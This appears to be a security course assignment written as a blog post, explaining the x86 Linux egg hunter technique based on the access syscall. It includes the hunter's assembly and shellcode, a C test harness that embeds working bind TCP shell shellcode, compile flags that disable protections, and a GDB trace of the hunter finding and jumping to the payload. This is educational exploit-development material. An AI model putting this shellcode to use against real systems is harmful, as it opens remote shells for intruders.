@@ -1,0 +1,462 @@
+---
+layout: post
+title:  "SLAE32 - Egg Hunter Technique"
+date:   2019-11-17 21:03:36 +0530
+categories: x86 ASM 
+---
+
+In this assignment we going to deep into the Egg Hunter Technique. In order to understand what this technique involves we  going to start defining what is an egg, next we mention what is the requirements to do a success egg hunter and finally we going to show you the Egg Hunter in action.
+
+
+
+## The Egg Hunter technique
+
+
+According to [Corelean] "an Egg Hunter is a technique that can be categorized as “staged shellcode”, and it basically allows you to use a small amount of custom shellcode to find your actual (bigger) shellcode (the “egg”) by searching for the final shellcode in memory".
+
+ Staged shellcode is used when the amount of data injected by the attacker is too limited to execute useful shellcode, so it may be possible to execute it in stages. First, small piece of code is injected by the attacker into memory (stage 1) in a predictable location and executed. This code search the entire VAS (Virtual Address Space) for the larger shellcode (the egg) and executes it.
+
+ During this blog post we going to use the Skape paper called "Safely Searching Process Virtual Address Space" 
+
+ Here is the link --> *http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf*
+
+
+## Key concepts 
+
+Before deep into the egg hunter implementation, we going to mention some important considerations about the egg:
+
+
+#### 1. Egg key size
+
+The author (Skape) in his document has determined that it is best to use an eight byte egg. According the author the main reason is the fact that the implementations for the egg hunting algorithms tend to have a four byte version of the key stored once in the searching code, so is possible to run into the egg hunter code itself if one of the four byte version of the key is accidentaly catch by the searching algorithm in the egg hunter.
+
+#### 2. Egg key format
+
+The egg key was provide in the form of assembler output because some egg hunter implementations require that the key itself be executable assembly code. This is not a rule, some egg hunter implementation like the access (2) revisited do not need an executable egg. 
+
+An example of eight byte key is as follows:
+
+```
+    00000000 90 nop
+    00000001 50 push eax
+    00000002 90 nop
+    00000003 50 push eax
+    00000004 90 nop
+    00000005 50 push eax
+    00000006 90 nop
+    00000007 50 push eax
+```
+
+The dword 0x50905090 is the 4 byte key used during the egg hunter algorithm. 
+
+## Implementation
+
+There are different implementation of egg hunter code, during this post we going to use the access syscall technique mentioned in the Skape paper. Is important to know that there are another implementation of egg hunter like sigaction, SEH (Windows), etc, but in this blog we going to mention the access method. To get a better understanding about different techiniques read the Skape paper. 
+
+The access syscall is one of the  techinique used by the author. The real purpose of this syscall is to check if the current process has the specific access rights to a given file on the disk. The author found a very cleaver way to abuse the syscall implementation and introduce it in a Egg hunter code.
+
+The following code is for access syscall egg Hunter:
+
+* Size: 39 bytes
+* Executable Egg: Yes
+
+```
+
+global _start
+
+section .text
+
+_start:
+        mov ebx,0x50905090 
+        xor ecx, ecx 
+        mul ecx 
+
+inc_page:
+        or dx, 0xfff 
+inc_mem:
+        inc edx 
+        pusha
+        lea ebx, [edx + 0x4]
+        mov al, 0x21 
+        int 0x80        
+        cmp al, 0xf2 
+        popa       
+        jz inc_page 
+        cmp [edx], ebx 
+        jnz inc_mem 
+        cmp [edx + 0x4], ebx 
+        jnz inc_mem 
+        jmp edx   
+
+```
+
+In order to use the egg hunter, the payload must look like this:
+
+```
+"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0"
+"\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
+```
+
+I use this objdump command to generate the shellcode
+
+```
+objdump -d ./egg|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '
+|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+```
+
+To test the egg hunter we wrap the shellcode into our C wrapper. First we define a constant in C with the name *w00f* with the EGG TAG. This constant later is putted twice in front of the shellcode (Bind TCP shellcode) doing this we can ensure when the Egg Hunter find this tag the next code to execute will be the Bind TCP shellcode used in this example.
+
+```
+#include<stdio.h>
+#include<string.h>
+
+#define w00f "\x90\x50\x90\x50" // eTAG 
+
+unsigned char ehunter[] = \
+
+// EGG HUNTER access syscall 
+
+"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0"
+"\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
+
+
+unsigned char code[] = w00f w00f \
+
+"\x31\xc0\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66"  // BIND TCP SHELLCODE
+"\xcd\x80\x89\xc6\x52\x66\x68\xaa\xaa\x66\x6a\x02\x89\xe1\x6a\x10"  // from assignment 1
+"\x51\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x52\x56\x89\xe1\xb3\x04"
+"\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89"
+"\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x52\x68\x2f"
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x52\x89\xe1\xb0\x0b"
+"\xcd\x80\x31\xc0\xb0\x01\xb3\x08\xcd\x80";              
+   
+
+main()
+{
+        printf("Egg Hunter Length:  %d\n", strlen(ehunter));
+        printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())ehunter;
+
+        ret();
+
+}
+```
+
+We compile the program with this options:
+
+`gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode`
+
+
+
+Testing the egg hunter code
+
+![alt text][img-1]
+
+### Analysis
+
+We open the program using  GDB with the -q option to skip banner information. Using the `info functions` command we can see the defined  functions of the program. 
+
+We set a breakpoint in the main function using the `break` command.
+
+```
+motu@motu-pc:~/ASM/Assignment-3$ gdb -q ./shellcode
+Reading symbols from ./shellcode...(no debugging symbols found)...done.
+gdb-peda$ info functions 
+All defined functions:
+
+Non-debugging symbols:
+0x00001000  _init
+0x00001030  printf@plt
+0x00001040  strlen@plt
+0x00001050  __libc_start_main@plt
+0x00001060  __cxa_finalize@plt
+0x00001070  _start
+0x000010b0  __x86.get_pc_thunk.bx
+0x000010c0  deregister_tm_clones
+0x00001100  register_tm_clones
+0x00001150  __do_global_dtors_aux
+0x000011a0  frame_dummy
+0x000011a5  __x86.get_pc_thunk.dx
+0x000011a9  main
+0x00001230  __libc_csu_init
+0x00001290  __libc_csu_fini
+0x00001294  _fini
+gdb-peda$ break *main 
+Breakpoint 1 at 0x11a9
+gdb-peda$ 
+
+
+``` 
+
+We skip until `call eax`  instruction. Basically this instruction pass the control to the ehunter code.
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x404020 --> 0x905090bb  <--- bb 90 50 90 50   mov    ebx,0x50905090 EGG HUNTER CODE
+EBX: 0x403fd4 --> 0x3edc 
+ECX: 0x0 
+EDX: 0xb7fb2890 --> 0x0 
+ESI: 0xb7fb1000 --> 0x1dcd6c 
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff020 --> 0x1 
+EIP: 0x40121c (<main+115>:      call   eax)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x401210 <main+103>: lea    eax,[ebx+0x4c]
+   0x401216 <main+109>: mov    DWORD PTR [ebp-0xc],eax
+   0x401219 <main+112>: mov    eax,DWORD PTR [ebp-0xc]
+=> 0x40121c <main+115>: call   eax
+   0x40121e <main+117>: mov    eax,0x0
+   0x401223 <main+122>: lea    esp,[ebp-0x8]
+   0x401226 <main+125>: pop    ecx
+   0x401227 <main+126>: pop    ebx
+No argument
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff020 --> 0x1 
+0004| 0xbffff024 --> 0xbffff0e4 --> 0xbffff2bb ("/home/motu/ASM/Assignment-3/shellcode")
+0008| 0xbffff028 --> 0xbffff0ec --> 0xbffff2e4 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
+0012| 0xbffff02c --> 0x404020 --> 0x905090bb 
+0016| 0xbffff030 --> 0xbffff050 --> 0x1 
+0020| 0xbffff034 --> 0x0 
+0024| 0xbffff038 --> 0x0 
+0028| 0xbffff03c --> 0xb7deeb41 (<__libc_start_main+241>:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0040121c in 
+
+```
+
+Using the `objdump` command we can see the assembly instructions of the egg hunter code. If you pay attention to the first instruction in the `_start` section of the egg hunter, this instruction is the egg tag which is save in reverse order (little endian) in the `eax` register. 
+
+
+```
+
+motu@motu-pc:~/ASM/Assignment-3$ objdump  -d -M intel egg
+
+egg:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <_start>:
+ 8049000:       bb 90 50 90 50          mov    ebx,0x50905090 < --- EGG TAG HERE
+ 8049005:       31 c9                   xor    ecx,ecx
+ 8049007:       f7 e1                   mul    ecx
+
+08049009 <inc_page>:
+ 8049009:       66 81 ca ff 0f          or     dx,0xfff
+
+  ...
+
+```
+Using the si (step into) command of GDB we can go through the `eax` register and see our ehunter code.
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x404020 --> 0x905090bb 
+EBX: 0x403fd4 --> 0x3edc 
+ECX: 0x0 
+EDX: 0xb7fb2890 --> 0x0 
+ESI: 0xb7fb1000 --> 0x1dcd6c 
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff01c --> 0x40121e (<main+117>:       mov    eax,0x0)
+EIP: 0x404020 --> 0x905090bb
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40401a:    add    BYTE PTR [eax],al
+   0x40401c:    add    BYTE PTR [eax],al
+   0x40401e:    add    BYTE PTR [eax],al
+=> 0x404020 <ehunter>:  mov    ebx,0x50905090   <----- OUR EGG HUNTER CODE BEGIN HERE
+   0x404025 <ehunter+5>:        xor    ecx,ecx
+   0x404027 <ehunter+7>:        mul    ecx
+   0x404029 <ehunter+9>:        or     dx,0xfff
+   0x40402e <ehunter+14>:       inc    edx
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff01c --> 0x40121e (<main+117>:      mov    eax,0x0)
+0004| 0xbffff020 --> 0x1 
+0008| 0xbffff024 --> 0xbffff0e4 --> 0xbffff2bb ("/home/motu/ASM/Assignment-3/shellcode")
+0012| 0xbffff028 --> 0xbffff0ec --> 0xbffff2e4 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
+0016| 0xbffff02c --> 0x404020 --> 0x905090bb 
+0020| 0xbffff030 --> 0xbffff050 --> 0x1 
+0024| 0xbffff034 --> 0x0 
+0028| 0xbffff038 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x00404020 in ehunter ()
+gdb-peda$ 
+```
+
+But ...
+
+### Where is my shellcode ?  
+
+#### JUMP EDX
+
+Well, using the access syscall technique the egg hunter will search the entire VAS until find the EGG TAG which is 0x50905090. If you pay attention to the egg hunter code after some validations the program jump to the `edx` register.
+
+```
+
+ jz inc_page 
+        cmp [edx], ebx 
+        jnz inc_mem 
+        cmp [edx + 0x4], ebx 
+        jnz inc_mem 
+        jmp edx   <- JMP TO MY SHELLCODE
+
+```
+
+We set a breakpoint in the `jmp edx` instruction and start the program again.
+
+
+```
+
+gdb-peda$ x/10i $eip 
+=> 0x404039 <ehunter+25>:       popa   
+   0x40403a <ehunter+26>:       je     0x404029 <ehunter+9>
+   0x40403c <ehunter+28>:       cmp    DWORD PTR [edx],ebx
+   0x40403e <ehunter+30>:       jne    0x40402e <ehunter+14>
+   0x404040 <ehunter+32>:       cmp    DWORD PTR [edx+0x4],ebx
+   0x404043 <ehunter+35>:       jne    0x40402e <ehunter+14>
+   0x404045 <ehunter+37>:       jmp    edx                         <--- We set the breakpoint here
+   0x404047 <ehunter+39>:       add    BYTE PTR [eax],al
+   0x404049:    add    BYTE PTR [eax],al
+   0x40404b:    add    BYTE PTR [eax],al
+gdb-peda$ break *0x404045
+Breakpoint 2 at 0x404045                        <--- 0x404045 <ehunter+37>:       jmp    edx  
+gdb-peda$ 
+
+
+```
+
+When the compiler hit the breakpoint we can see the values of `ebx` and `edx` register which contains our egg tag. In the `0x404040 <ehunter+32>` the program compare both registers and if the value is the same go to the `jmp edx` instruction.
+
+```
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x50905090 <-- OUR EGG TAG HERE
+ECX: 0x0 
+EDX: 0x404060 --> 0x50905090  <-- OUR EGG TAG HERE
+ESI: 0xb7fb1000 --> 0x1dcd6c 
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff01c --> 0x40121e (<main+117>:       mov    eax,0x0)
+EIP: 0x404045 --> 0xe2ff
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40403e <ehunter+30>:       jne    0x40402e <ehunter+14>
+   0x404040 <ehunter+32>:       cmp    DWORD PTR [edx+0x4],ebx
+   0x404043 <ehunter+35>:       jne    0x40402e <ehunter+14>
+=> 0x404045 <ehunter+37>:       jmp    edx
+ | 0x404047 <ehunter+39>:       add    BYTE PTR [eax],al
+ | 0x404049:    add    BYTE PTR [eax],al
+ | 0x40404b:    add    BYTE PTR [eax],al
+ | 0x40404d:    add    BYTE PTR [eax],al
+ |->   0x404060 <code>: nop
+       0x404061 <code+1>:       push   eax <- JUMP HERE IF EDX+4 = EBX
+       0x404062 <code+2>:       nop
+       0x404063 <code+3>:       push   eax
+                                                                  JUMP is taken
+```
+
+
+We can see in the `0x404068 <code+8>` instruction the begining of our shellcode.
+
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x50905090 
+ECX: 0x0 
+EDX: 0x404060 --> 0x50905090 
+ESI: 0xb7fb1000 --> 0x1dcd6c 
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff00c --> 0x0 
+EIP: 0x40406a --> 0x5099db31
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x404066 <code+6>:   nop
+   0x404067 <code+7>:   push   eax      
+   0x404068 <code+8>:   xor    eax,eax    <---- HERE OUR SHELLCODE BEGIN
+=> 0x40406a <code+10>:  xor    ebx,ebx
+   0x40406c <code+12>:  cdq    
+   0x40406d <code+13>:  push   eax
+   0x40406e <code+14>:  push   0x1
+   0x404070 <code+16>:  push   0x2
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff00c --> 0x0 
+0004| 0xbffff010 --> 0x0 
+0008| 0xbffff014 --> 0x0 
+0012| 0xbffff018 --> 0x0 
+0016| 0xbffff01c --> 0x40121e (<main+117>:      mov    eax,0x0)
+0020| 0xbffff020 --> 0x1 
+0024| 0xbffff024 --> 0xbffff0e4 --> 0xbffff2bb ("/home/motu/ASM/Assignment-3/shellcode")
+0028| 0xbffff028 --> 0xbffff0ec --> 0xbffff2e4 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0040406a in code ()
+gdb-peda$ 
+
+
+```
+
+How the Egg Hunter know where my shellcode begin ? We can validate this viewing the souce code of shellcode used in this example.
+
+```
+
+global _start
+
+  _start:
+
+  ; int socket(int domain, int type, int protocol); 
+
+  xor eax, eax      <--- HERE THE SHELLCODE BEGIN
+  xor ebx, ebx
+  cdq
+
+  push eax              ; protocol - 0
+  push byte 0x1         ; type - SOCK_STREAM
+  push byte 0x2         ; dominio - AF_INET
+  
+  mov ecx, esp          
+  inc bl                ; sys_socket 
+  mov al, 102           ; socketcall system call
+  int 0x80
+
+```
+
+If we remember from our C wrapper the w00f string contains the EGG TAG. This string repeat twice and when the Egg Hunter find this pattern in the VAS transfer the control to the begining of our shellcode using the `jmp edx` instruction.
+
+
+```
+unsigned char code[] = w00f w00f \
+
+"\x31\xc0\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66"  // BIND TCP SHELLCODE
+"\xcd\x80\x89\xc6\x52\x66\x68\xaa\xaa\x66\x6a\x02\x89\xe1\x6a\x10"  // from assignment 1
+"\x51\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x52\x56\x89\xe1\xb3\x04"
+"\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89"
+"\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x52\x68\x2f"
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x52\x89\xe1\xb0\x0b"
+"\xcd\x80\x31\xc0\xb0\x01\xb3\x08\xcd\x80";              
+   
+```
+
+Great !!
+
+
+[img-1]: https://h4pp1n3ss.github.io/assets/images/egghunter-poc.png "Egg Hunter PoC"
+
+
+[img-2]: https://h4pp1n3ss.github.io/assets/images/buffer2.png "Egg hunter"
+
+### EPILOGUE
+
+In this post we see how egg hunter works, how the syscall techinique is used to find the egg tag and how the egg hunter pass the control to our shellcode. This technique is useful in situations when the buffer length is limited and we need an stagged shellcode to exploit a vulnerability.
+
+*** 
+
+
